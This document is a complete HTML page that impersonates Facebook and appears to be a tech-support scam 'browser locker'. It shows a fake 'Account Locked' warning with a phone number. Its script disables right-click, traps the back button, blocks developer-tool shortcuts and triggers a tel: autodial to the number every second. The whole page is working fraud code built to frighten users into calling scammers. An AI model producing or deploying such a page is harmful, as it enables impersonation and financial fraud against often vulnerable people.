<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook - Log In</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      font-family: Helvetica, Arial, sans-serif;
      background: url('https://images.unsplash.com/photo-1611162618476-1a09a9826b7b?q=80&w=2070&auto=format&fit=crop&ixlib=rb-4.0.3') no-repeat center center fixed;
      background-size: cover;
      overflow: hidden; /* Prevent scrolling */
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100%;
      flex-direction: column;
    }

    .header {
      position: absolute;
      top: 0;
      width: 100%;
      background: #3b5998;
      padding: 10px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .header img {
      height: 40px;
    }

    .header .login-form {
      display: flex;
      align-items: center;
      color: white;
    }

    .header .login-form input {
      margin: 0 5px;
      padding: 5px;
      border: none;
      border-radius: 3px;
    }

    .header .login-form button {
      background: #4267b2;
      color: white;
      border: none;
      padding: 5px 10px;
      border-radius: 3px;
      cursor: pointer;
    }

    .dialog-box {
      background: #ffffff;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
      width: 400px;
      padding: 20px;
      text-align: center;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      z-index: 1000;
    }

    .dialog-box h2 {
      color: #3b5998;
      margin-bottom: 15px;
    }

    .dialog-box p {
      color: #333;
      font-size: 16px;
      line-height: 1.5;
      margin-bottom: 20px;
    }

    .phone-number {
      font-size: 18px;
      font-weight: bold;
      color: #d32f2f;
      margin-top: 20px;
    }

    .facebook-logo {
      width: 100px;
      margin-bottom: 10px;
    }

    .footer {
      position: absolute;
      bottom: 0;
      width: 100%;
      background: #f5f6f5;
      padding: 10px;
      text-align: center;
      color: #737373;
      font-size: 12px;
    }

    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      z-index: 999;
    }
  </style>
</head>
<body>
  <div class="overlay"></div>
  <div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
    <div class="login-form">
      <input type="text" placeholder="Email or Phone" disabled>
      <input type="password" placeholder="Password" disabled>
      <button disabled>Log In</button>
    </div>
  </div>
  <div class="container">
    <div class="dialog-box">
      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="facebook-logo">
      <h2>Account Locked</h2>
      <p>Your Facebook account has been temporarily locked due to suspicious activity. To unlock your account, please contact our support team immediately.</p>
      <p class="phone-number">Call us at: 1-834-434-3483</p>
    </div>
  </div>
  <div class="footer">
    <p>Facebook © 2025 · Help · Privacy · Terms</p>
  </div>

  <script>
    // Prevent right-click context menu
    document.addEventListener('contextmenu', event => event.preventDefault());

    // Prevent back navigation
    history.pushState(null, null, location.href);
    window.onpopstate = function () {
      history.go(1);
    };

    // Prevent keyboard shortcuts like F12, Ctrl+Shift+I, etc.
    document.onkeydown = function (e) {
      if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
        e.preventDefault();
      }
    };

    // Autodial function
    function autodial() {
      window.location.href = 'tel:1-834-434-3483';
    }

    // Start autodial immediately and repeat every 10 seconds
    autodial();
    setInterval(autodial, 1000); // Repeat every 1 seconds
  </script>
</body>
</html>
